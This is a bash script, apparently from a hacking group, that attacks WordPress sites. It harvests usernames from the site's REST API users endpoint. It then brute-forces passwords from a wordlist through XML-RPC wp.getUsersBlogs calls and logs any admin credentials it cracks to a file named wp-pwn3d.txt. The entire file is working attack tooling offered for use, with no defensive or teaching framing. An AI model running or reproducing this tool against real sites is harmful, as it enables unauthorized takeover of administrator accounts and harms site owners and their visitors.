#!/bin/bash
#COPYRIGHT LeakC0de & NTB4WORLD
#CODED BY MinorityCode_
#Thanks to Eka Syahwan ( PHP SVScanner )

#COLOR
BGNVAVY="\033[1;46m"
BGYELLOW="\033[1;43m"
BGGREEN="\e[1;42m"
BGRED="\e[1;41m"
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'

#CODE
header () {
printf "${RED}
  ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
  ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
  ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
  ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
  .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
     ${RED}------------------------------------${NOCOLOR}
              CODED BY NTB4WORLD
     ${RED}------------------------------------${NOCOLOR}
"
}
header
echo "1. Use Username from getUsername"
echo "2. Use Custom Username"
read -p "Choose Mode : " mode;
if [[ $mode -eq 1 ]]; then
	clear
	header
	getUsername(){
		getUser=$( curl -s "${url}/wp-json/wp/v2/users" )
		UserName=$( echo $getUser | grep -Po '(?<=slug":")[^"]*' | tail -1)
		# echo $UserName
	}
	
	echo -n "Masukkan URL : "
	read url
	echo "[x] Getting Username... Please Wait..."
	getUsername
	BForce(){
		brute=$( curl -s "${url}/xmlrpc.php" --data "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>${UserName}</value></param><param><value>${1}</value></param></params></methodCall>")
		grep=$( echo $brute | grep -Po '(?<=<member><name>isAdmin<\/name><value><boolean>).*?(?=</)' )
		site=$( echo $brute | grep -Po '(?<=<member><name>url<\/name><value><string>).*?(?=</)' )
		title=$( echo $brute | grep -Po '(?<=<member><name>blogName<\/name><value><string>).*?(?=</)' )
		printf "[!] ${NOCOLOR}${BGYELLOW}${1}${NOCOLOR} | "
		if [[ $grep == '1' ]]; then
			# echo $brute
			printf "RESP : ${BGGREEN}SUCCESS!!!${NOCOLOR}\n"
			printf "INFO : USERNAME : ${BGGREEN}$UserName${NOCOLOR} | PASSWORD : ${BGGREEN}${1}${NOCOLOR} | TITLE : ${BGGREEN}${title}${NOCOLOR} | SITE : ${BGGREEN}${site}${NOCOLOR} \n"
			echo "INFO : USERNAME : $UserName | PASSWORD : ${1} | TITLE : ${title} | SITE : ${site}" >> wp-pwn3d.txt
			exit
		else
			printf "RESP : ${BGRED}Gagal!!!${NOCOLOR} \n"
		fi
			
		}
		printf "[!] Username : ${BGNVAVY}$UserName${NOCOLOR} \n"
		printf "[x] Tryng to BruteForce with Username [ ${BGNVAVY}$UserName${NOCOLOR} ] \n"
		echo ""
		echo "List In This Directory :"
		echo "+====================================================+"
		ls
		echo "+====================================================+"
		echo -n "Put Your Pwd List : "
	    read list
	    echo ""
	    if [ ! -f $list ]; then
			echo "[404] $list No Such File in Directory"
		    exit
	    fi
	    IFS=$'\r\n' GLOBIGNORE='*' command eval 'pwdlist=($(cat $list))'
	    for (( i = 0; i < "${#pwdlist[@]}"; i++ )); do
	    	pwdlist="${pwdlist[$i]}"
	    	BForce $pwdlist
	    done
elif [[ $mode -eq 2 ]]; then
	clear
	header
	BForce(){
		brute=$( curl -s "${url}/xmlrpc.php" --data "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>${UserName}</value></param><param><value>${1}</value></param></params></methodCall>")
		grep=$( echo $brute | grep -Po '(?<=<member><name>isAdmin<\/name><value><boolean>).*?(?=</)' )
		site=$( echo $brute | grep -Po '(?<=<member><name>url<\/name><value><string>).*?(?=</)' )
		title=$( echo $brute | grep -Po '(?<=<member><name>blogName<\/name><value><string>).*?(?=</)' )
		printf "[!] ${NOCOLOR} : ${BGYELLOW}${1}${NOCOLOR} | "
		if [[ $grep == '1' ]]; then
			printf "RESP : ${BGGREEN}SUCCESS!!!${NOCOLOR}\n"
			printf "INFO : USERNAME : ${BGGREEN}$UserName${NOCOLOR} | PASSWORD : ${BGGREEN}${1}${NOCOLOR} | TITLE : ${BGGREEN}${title}${NOCOLOR} | SITE : ${BGGREEN}${site}${NOCOLOR}\n"
			echo "INFO : USERNAME : $UserName | PASSWORD : ${1} | TITLE : ${title} | SITE : ${site}" >> wp-pwn3d.txt
			exit
		else
			printf "RESP : ${BGRED}Gagal!!!${NOCOLOR} \n"
		fi
			
		}
	echo -n "Masukkan URL : "; read url
	echo -n "Masukkan Username : "; read UserName
	printf "[!] Username : ${BGNVAVY}$UserName${NOCOLOR} \n"
	printf "[x] Tryng to BruteForce with Username [ ${BGNVAVY}$UserName${NOCOLOR} ] \n"
	echo ""
	echo "List In This Directory :"
	echo "+====================================================+"
	ls
	echo "+====================================================+"
	echo -n "Put Your Pwd List : "
    read list
    echo ""
    if [ ! -f $list ]; then
		echo "[404] $list No Such File in Directory"
	    exit
    fi
    IFS=$'\r\n' GLOBIGNORE='*' command eval 'pwdlist=($(cat $list))'
    for (( i = 0; i < "${#pwdlist[@]}"; i++ )); do
    	pwdlist="${pwdlist[$i]}"
    	BForce $pwdlist
    done
fi
